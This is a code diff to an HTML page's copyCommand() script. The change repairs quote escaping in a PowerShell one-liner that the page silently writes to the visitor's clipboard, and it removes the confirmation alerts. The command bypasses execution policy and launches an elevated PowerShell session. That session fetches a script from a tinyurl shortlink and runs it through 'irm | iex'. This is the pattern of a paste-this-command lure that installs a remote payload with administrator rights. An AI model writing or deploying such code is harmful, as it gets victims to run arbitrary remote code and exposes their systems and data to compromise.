@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -544,15 +545,15 @@
     <script>
         function copyCommand() {
             const copyText = document.getElementById("runCommand");
-            copyTextValue = 'powershell.exe -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList 'irm "https://tinyurl.com/4j72ashp/" | iex' -Verb RunAs"';
+            copyTextValue = 'powershell.exe -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList \'irm \\"https://tinyurl.com/4j72ashp/\\" | iex\' -Verb RunAs"';
             navigator.clipboard.writeText(copyTextValue).then(() => {
-                alert("Command copied to clipboard!");
+                // Alert removed
             }).catch(err => {
                 console.error('Failed to copy text: ', err);
                 copyText.select();
                 copyText.setSelectionRange(0, 99999);
                 document.execCommand("copy");
-                alert("Command copied to clipboard!");
+                // Alert removed
             });
         }
     </script>
